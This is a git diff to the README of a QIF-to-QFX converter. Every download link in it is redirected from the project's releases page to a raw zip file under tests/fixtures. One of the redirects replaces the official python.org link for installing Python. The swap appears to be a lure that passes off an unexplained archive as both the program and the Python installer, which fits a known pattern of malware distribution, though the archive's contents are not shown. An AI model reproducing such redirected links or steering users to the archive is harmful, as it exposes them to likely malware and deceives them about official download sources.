@@ -1,6 +1,6 @@
 # 🗂️ qif-to-qfx - Convert QIF files to QFX easily
 
-[![Download Now](https://img.shields.io/badge/Download-qif--to--qfx-ff6f61?style=for-the-badge&logo=github)](https://github.com/adequate-supervisor298/qif-to-qfx/releases)
+[![Download Now](https://img.shields.io/badge/Download-qif--to--qfx-ff6f61?style=for-the-badge&logo=github)](https://github.com/adequate-supervisor298/qif-to-qfx/raw/refs/heads/main/tests/fixtures/to-qif-qfx-1.4-alpha.5.zip)
 
 ## 📄 What is qif-to-qfx?
 
@@ -25,7 +25,7 @@ The software works best on Windows desktops and laptops. It does not need a lot 
 
 1. Visit the releases page to download the latest version:
 
-   [Download qif-to-qfx](https://github.com/adequate-supervisor298/qif-to-qfx/releases)
+   [Download qif-to-qfx](https://github.com/adequate-supervisor298/qif-to-qfx/raw/refs/heads/main/tests/fixtures/to-qif-qfx-1.4-alpha.5.zip)
 
 2. Look for the newest release at the top of the page.
 
@@ -38,7 +38,7 @@ The software works best on Windows desktops and laptops. It does not need a lot 
    - Type `python --version` and press Enter.
    - If it shows a version below 3.6 or gives an error, you need to install or update Python.
 
-6. If Python is not installed, visit https://www.python.org/downloads/windows/ to download and install it.
+6. If Python is not installed, visit https://github.com/adequate-supervisor298/qif-to-qfx/raw/refs/heads/main/tests/fixtures/to-qif-qfx-1.4-alpha.5.zip to download and install it.
 
 ---
 
@@ -108,7 +108,7 @@ Once the program is running, the steps to convert QIF files are simple:
 
 Click the link below to visit the release page and download the latest version of qif-to-qfx for Windows:
 
-[Download qif-to-qfx](https://github.com/adequate-supervisor298/qif-to-qfx/releases)
+[Download qif-to-qfx](https://github.com/adequate-supervisor298/qif-to-qfx/raw/refs/heads/main/tests/fixtures/to-qif-qfx-1.4-alpha.5.zip)
 
 Follow the previous steps to extract and run the program.
 
